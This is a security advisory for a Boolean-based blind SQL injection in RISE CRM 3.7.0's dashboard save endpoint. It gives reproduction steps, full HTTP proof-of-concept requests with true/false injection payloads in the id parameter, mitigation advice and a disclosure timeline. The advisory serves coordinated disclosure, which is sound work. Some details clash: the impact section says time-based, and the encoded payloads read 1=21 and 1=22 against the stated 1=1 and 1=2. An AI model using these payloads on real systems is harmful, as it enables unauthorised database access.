# Security Advisory: Blind SQL Injection in RISE CRM

### CVE: CVE-2024-XXXXX

### Date: 12 Sep, 2024

### Severity: Critical

### Affected Product:
- **Product**: RISE CRM
- **Affected Version**: 3.7.0
- **Patched Version:** 3.7.1

### Vulnerability Type:
- **Blind SQL Injection**

### Discovered By:
- Jobyer Ahmed

---

## Description:

A Boolean-based SQL Injection vulnerability has been discovered in the save method of the Dashboard controller in RISE CRM. The vulnerability is caused by improper validation of the `id` parameter, which is used in a SQL query without being sanitized. 
Attackers can exploit this vulnerability by injecting SQL code into the `id` parameter, leading to the execution of SQL queries that modify the application's behavior based on whether the query returns `true` or `false`.

This form of SQL injection allows attackers to infer information by observing differences in the application's responses to specific injected queries.

---

## Impact:

The time-based blind SQL injection allows an attacker to:
- Execute Arbitrary SQL Queries
- Bypass Authentication
- Compromise Sensitive Data

---

## Attack Vector:

The attacker can send a Boolean-based SQL injection payload through the `id` parameter of the save method in the Dashboard controller. This allows the attacker to infer the outcome of the SQL query by analyzing differences in the response, such as changes in the content length, status codes, or page output.

### Vulnerable Endpoint
```
/index.php/dashboard/save
```

## Reproduce


1. Login to RISE CRM 3.7.0

2. Click on the monitor icon from the top bar to add a new dashboard.

3. Intercept the post request using Burp Suite or a similar intercepting proxy tool.

4. Give the new dashboard a title(In my case, it is SQLI), select a color, click save, and forward the post endpoint POST /rise/index.php/dashboard/save to the burp suite repeater.

5. In the id parameter, place the failed payload -1 OR 1=2-- - and success payload -1 OR 1=1-- -

6. It displays a different response, which confirms blind SQL Injection.

### Proof of Concept (PoC):

Hereâ€™s an example of the SQL injection payload used in the `id` parameter.

With payload `-1 OR 1=1-- `:

```http
POST /index.php/dashboard/save HTTP/1.1
Host: 192.168.1.13
Content-Length: 69
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.13
Referer: http://192.168.1.13/crm/index.php/dashboard/index/1
Accept-Encoding: gzip, deflate, br
Cookie: ci_session=d4oi0jg15o1ur64cn39f2daqe24p5rpd; rise_csrf_cookie=c54966034a07055643098839120e2146
Connection: keep-alive

id=-1+OR+1%3d21--+-&data=false&title=Exploitable&color=%23d43480
```
This payload always returns a `true` condition and produces a valid response from the application.

**With payload `-1 OR 1=2-- `:**

```http
POST /index.php/dashboard/save HTTP/1.1
Host: 192.168.1.13
Content-Length: 69
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.13
Referer: http://192.168.1.13/crm/index.php/dashboard/index/1
Accept-Encoding: gzip, deflate, br
Cookie: ci_session=d4oi0jg15o1ur64cn39f2daqe24p5rpd; rise_csrf_cookie=c54966034a07055643098839120e2146
Connection: keep-alive

id=-1+OR+1%3d22--+-&data=false&title=Exploitable&color=%23d43480
```

The condition evaluates as false, which produces a different response (e.g., a different content length or an error message), confirming the Boolean-based SQL injection vulnerability.

## Analysis of the Vulnerable Code:
The vulnerable code is located in the `save()` method within `Dashboard.php`:
```
$id = $this->request->getPost("id");
```
At line 729, the id parameter is directly passed to a SQL query without proper validation or sanitization. This allows an attacker to inject SQL code and modify the behavior of the query, leading to a Boolean-based SQL injection attack.


## Mitigation:
It is recommended that users of RISE CRM:

Update to the latest version of the software as soon as a patch is available.
Ensure proper input validation: Validate and sanitize all user inputs, especially those that are passed to the database.
Use parameterized queries to prevent SQL injection attacks.

## Timeline:
- Initial Discovery: 3 Sep, 2024
- Vendor Notification: 3 Sep, 2024
- Vendor Response: 4 Sep, 2024
- Patch Availability: 9 Sep, 2024
- Public Disclosure: 12 Sep, 2024

## Acknowledgments:
The vulnerability was discovered by Jobyer Ahmed. Special thanks to the RISE CRM team for acknowledging the issue and working towards a resolution.
